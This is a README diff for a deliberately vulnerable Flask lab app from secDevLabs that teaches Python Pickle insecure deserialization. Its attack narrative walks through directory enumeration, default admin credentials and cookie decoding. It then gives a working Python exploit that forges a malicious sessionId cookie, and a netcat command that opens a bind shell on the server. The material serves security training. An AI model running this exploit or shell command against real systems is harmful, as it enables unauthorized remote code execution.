@@ -1,40 +1,176 @@
 # Amarelo Designs
- > This is a simple web application built with Flask that contains an example of an Insecure Deserialization vulnerability.
 
-<img src="images/Amarelo-Designs.png" align="center"/>
+<p align="center">
+    <img src="images/Amarelo-Designs.png"/>
+</p>
+
+This is a simple web application built with Flask that contains an example of an Insecure Deserialization vulnerability and, it's main goal, is to describe how a malicious user could exploit a vulnerability, intentionally installed on Amarelo Designs from secDevLabs, to obtain a blind remote code execution.
+
+## Index
+
+- [Definition](#what-is-insecure-deserialization)
+- [Setup](#setup)
+- [Attack narrative](#attack-narrative)
+- [Objectives](#secure-this-app)
+- [Solutions](#pr-solutions)
+- [Contributing](#contributing)
 
 ## What is Insecure Deserialization?
 
-Definition from [OWASP](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf):
+Serialization is the process of translating data structures, or object state, into a format that can be stored or transmitted and reconstructed later. Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.
 
-Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.
+The main goal of this app is to discuss how **Insecure Deserialization** vulnerabilities can be exploited and to encourage developers to send secDevLabs Pull Requests on how they would mitigate these flaws.
 
-## Requirements
+## Setup
 
-To build this lab you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install].
+To start this intentionally **insecure application**, you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:
 
-## Deploy and Run
-
-After cloning this repository, you can type the following command to start the vulnerable application:
+```sh
+cd secDevLabs/owasp-top10-2017-apps/a8/amarelo-designs
+```
 
 ```sh
 make install
 ```
 
-Then simply visit [localhost:5000][App] !
+Then simply visit [localhost:5000][App] ! 😆
 
-## Attack Narrative
+## Get to know the app 🎨
 
-To understand how this vulnerability can be exploited, check [this section]!
+To properly understand how this application works, you can follow these simple steps:
 
-## Mitigating the vulnerability
+- Visit the homepage!
+- Have a look at the portfolio
 
-(Spoiler alert 🧐) To understand how this vulnerability can be mitigated, check [this other section](https://github.com/globocom/secDevLabs/pulls?q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3A%22Amarelo+Designs%22)!
+## Attack narrative
+
+Now that you know the purpose of this app, what could possibly go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or it's users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜
+
+### 👀
+
+#### Use of an insecure deserialization function allows for remote code execution
+
+It's possible to reach the server's web application from the HTTP port 5000, as shown by the image below:
+
+<img src="images/attack1.png" align="center"/>
+
+Making use of the [Dirb] tool to search for webpages and a common directories [wordlist], we were able to find `/user`, `/admin` and `/console`, as shown by the picture below: (If you want to install Dirb for Mac OS, be sure to click [here][4])
+
+```sh
+$ dirb http://localhost:5000 ./docs/common.txt
+```
+
+<p align="center">
+    <img src="images/attack2.png"/>
+</p>
+
+When accessed, the `/admin` page exposes an authentication screen, as depicted by the image:
+
+<p align="center">
+    <img src="images/attack3.png"/>
+</p>
+
+### 🔥
+ 
+A quick test utilizing `admin` as the credentials for the `Username` and `Password` fields, gives us acess to an Admin Dashboard, as shown below:
+
+<img src="images/attack4.png" align="center"/>
+
+Now, using [Burp Suite] as proxy to intercept the login request, we can see that the app returns a session cookie, `sessionId`, as depicted below:
+
+<img src="images/attack5.png" align="center"/>
+
+After decoding the cookie, which is in base64, the following structure was found:
+
+<img src="images/attack6.png" align="center"/>
+
+The structure found is very similar to the ones created with the [Pickle] function. We can be certain of that by having a look at the app's [code][3]. The hint is now confirmed, the app uses Pickle, as we can see from the image below:
+
+
+<img src="images/attack7.png" align="center"/>
+
+If an attacker knew that the app uses `Pickle` as the serialisation method, he/she could create a malicious cookie to take advantage of it and execute code remotely. An example of an exploit (serializaPickle.py) in Python 3 that could produce this cookie could be:
+
+```python
+import pickle
+import os
+import base64
+import sys
+import requests
+
+cmd = str(sys.argv[1])
+url = str(sys.argv[2])
+
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, (cmd, ))
+
+
+pickle_result = pickle.dumps(Exploit())
+
+result = str(base64.b64encode(pickle_result), "utf-8")
+
+print(result)
+print(cmd)
+print(url)
+
+cookie = {'sessionId': result}
+
+print(cookie)
+
+r = requests.get(url, cookies=cookie)
+```
+
+In order to be certain that the app is exploitable, we will send a sleep command to make the app unresposive for 10 seconds. If the app takes 10 seconds to return our request, than it's confirmed, the app is exploitable. As we can see from the image below, the app takes some time to return our request, thus confirming that it is exploitable and confirming the remote code execution:
+
+```sh
+$ python3 serializaPickle.py "sleep 10" http://localhost:5000/user
+```
+
+<img src="images/attack9.png" align="center"/>
+
+In order to show how an attacker could have access to the server through a RCE, we will use the code depicted on the image below to create a bind shell on the server's 9051 port.
+
+```sh
+$ python3 serializaPickle.py "nc -lvp 9051 -e /bin/sh" http://localhost:5000/user
+```
+
+<img src="images/attack10.png" align="center"/>
+
+The code used above creates a bind shell on the server's port 9051, which is then listening for incoming connections. After that, the attacker can connect to that port using a simple [netcat] command, as shown below:
+
+```sh
+$ nc localhost 9051
+```
+
+<p align="center">
+    <img src="images/attack11.png"/>
+</p>
+
+## Secure this app
+
+How would you migitate this vulnerability? After your changes, an attacker should not be able to:
+
+* Execute code remotely through a serialization vulnerability
+
+## PR solutions
+
+[Spoiler alert 🚨] To understand how this vulnerability can be mitigated, check out [these pull requests](https://github.com/globocom/secDevLabs/pulls?q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3A%22Amarelo+Designs%22)!
+
 ## Contributing
 
-Yes, please. :zap:
+We encourage you to contribute to SecDevLabs! Please check out the [Contributing to SecDevLabs](../../../docs/CONTRIBUTING.md) section for guidelines on how to proceed! 🎉
 
 [Docker Install]:  https://docs.docker.com/install/
 [Docker Compose Install]: https://docs.docker.com/compose/install/
-[App]: http://127.0.0.1:5000
-[this section]: https://github.com/globocom/secDevLabs/blob/master/owasp-top10-2017-apps/a8/amarelo-designs/docs/ATTACK.md
+[App]: http://localhost:5000
+[secDevLabs]: https://github.com/globocom/secDevLabs
+[2]: https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2017-apps/a8/amarelo-designs
+[Dirb]: https://tools.kali.org/web-applications/dirb
+[Burp Suite]: https://en.wikipedia.org/wiki/Burp_suite
+[3]: https://github.com/globocom/secDevLabs/blob/master/owasp-top10-2017-apps/a8/amarelo-designs/app/app.py
+[Pickle]: https://docs.python.org/2/library/pickle.html
+[netcat]: https://en.wikipedia.org/wiki/Netcat
+[4]: https://github.com/globocom/secDevLabs/blob/master/docs/Dirb.md
+[wordlist]: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt
